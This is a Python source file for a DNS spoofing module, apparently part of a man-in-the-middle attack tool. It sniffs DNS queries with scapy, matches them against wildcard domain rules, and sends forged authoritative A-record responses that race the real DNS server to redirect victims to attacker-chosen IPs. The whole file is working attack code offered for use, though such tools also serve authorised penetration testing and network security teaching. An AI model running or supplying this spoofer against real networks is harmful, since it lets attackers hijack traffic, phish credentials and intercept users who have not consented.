"""
DNS Spoofing Module
Intercepts DNS queries and returns forged responses during MITM.

NOTE: On Windows without NFQUEUE, this operates as a "fast responder" —
it races the legitimate DNS server. Reliability depends on network latency.
For maximum reliability, use with a custom DNS proxy approach or on Linux with NFQUEUE.
"""
import ipaddress
import re
import threading
import time
from collections import defaultdict

try:
    from scapy.all import (
        DNS, DNSQR, DNSRR, IP, UDP, Ether,
        sniff, sendp, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# Spoof rules: domain -> redirect IP
_spoof_rules: dict[str, str] = {}
_running = False
_sniff_thread = None
_stats = defaultdict(int)


def add_rule(domain: str, redirect_ip: str):
    """Add a DNS spoof rule. Wildcards (*) supported."""
    _spoof_rules[domain.lower()] = redirect_ip
    print(f"  [+] Rule: {domain} -> {redirect_ip}")


def remove_rule(domain: str):
    """Remove a DNS spoof rule."""
    _spoof_rules.pop(domain.lower(), None)
    print(f"  [-] Removed rule: {domain}")


def clear_rules():
    """Remove all rules."""
    _spoof_rules.clear()
    print("  [-] All rules cleared")


def has_rules() -> bool:
    """Return True if any spoof rules are defined."""
    return len(_spoof_rules) > 0


def show_rules():
    """Display current spoof rules."""
    if not _spoof_rules:
        print("  No active rules.")
        return
    print("\n  Active DNS Spoof Rules:")
    print("  " + "-" * 40)
    for domain, ip in _spoof_rules.items():
        print(f"  {domain:30s} -> {ip}")
    print("  " + "-" * 40)


def _match_domain(queried: str) -> str | None:
    """Check if queried domain matches any rule. Returns redirect IP or None."""
    queried = queried.lower().rstrip(".")
    for pattern, redirect_ip in _spoof_rules.items():
        if pattern == queried:
            return redirect_ip
        if "*" in pattern:
            regex = "^" + re.escape(pattern).replace(r"\*", ".*") + "$"
            if re.match(regex, queried):
                return redirect_ip
    return None


def _dns_handler(packet):
    """Callback for sniffed DNS queries."""
    global _stats

    if not packet.haslayer(Ether) or not packet.haslayer(IP) or not packet.haslayer(UDP):
        return
    if not packet.haslayer(DNS) or not packet.haslayer(DNSQR):
        return

    # Only handle queries (qr=0)
    dns = packet[DNS]
    if dns.qr != 0:
        return

    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore")

    # Only spoof A (IPv4) queries for reliability
    if packet[DNSQR].qtype != 1:
        return

    redirect_ip = _match_domain(qname)

    if redirect_ip is None:
        return

    _stats["matched"] += 1
    print(f"  [DNS] {qname:40s} -> {redirect_ip}")

    # Build forged DNS response
    try:
        eth = packet[Ether]

        # Get original IP and UDP layers
        orig_ip = packet[IP]
        orig_udp = packet[UDP]

        # Craft the response
        forged_dns = DNS(
            id=dns.id,
            qr=1,           # Response
            aa=1,           # Authoritative
            rd=dns.rd,
            ra=0,
            qdcount=1,
            ancount=1,
            qd=dns[DNSQR],
            an=DNSRR(
                rrname=qname.encode() if isinstance(qname, str) else qname,
                type="A",
                rdata=redirect_ip,
                ttl=300,
            ),
        )

        forged_ip = IP(
            src=orig_ip.dst,
            dst=orig_ip.src,
        )
        forged_udp = UDP(
            sport=orig_udp.dport,
            dport=orig_udp.sport,
        )

        # Send at Layer 2
        response = Ether(
            src=eth.dst,
            dst=eth.src,
        ) / forged_ip / forged_udp / forged_dns

        sendp(response, verbose=0, iface=eth.sniffed_on if hasattr(eth, 'sniffed_on') else conf.iface)

    except Exception as e:
        _stats["errors"] += 1
        if _stats["errors"] <= 3:
            print(f"  [!] DNS response error: {e}")


def start_spoof(interface: str | None = None):
    """Start DNS spoofing in a background thread."""
    global _running, _sniff_thread

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed.")
        return False

    if _running:
        print("[!] DNS spoofing is already running.")
        return False

    if not _spoof_rules:
        print("[!] No spoof rules defined. Use add_rule() first.")
        return False

    _running = True
    _stats.clear()

    print(f"\n[*] Starting DNS spoofing ({len(_spoof_rules)} rule(s))")
    print("[*] Listening for DNS queries...")

    def sniffer():
        try:
            sniff(
                filter="udp port 53",
                prn=_dns_handler,
                store=0,
                stop_filter=lambda p: not _running,
                iface=interface,
            )
        except Exception as e:
            print(f"\n[!] DNS sniffer error: {e}")
        finally:
            global _running
            _running = False

    _sniff_thread = threading.Thread(target=sniffer, daemon=True)
    _sniff_thread.start()

    print(f"[✓] DNS spoofing active\n")
    return True


def stop_spoof():
    """Stop DNS spoofing."""
    global _running, _sniff_thread

    if not _running:
        return

    print("\n[*] Stopping DNS spoofing...")
    _running = False

    if _sniff_thread:
        _sniff_thread.join(timeout=3.0)
        _sniff_thread = None

    print(f"[*] Stats: {_stats['matched']} queries redirected, {_stats['errors']} errors")
    print("[✓] DNS spoofing stopped\n")


def is_spoofing() -> bool:
    return _running


if __name__ == "__main__":
    print("DNS Spoof module - import and use from mitm_app.py")
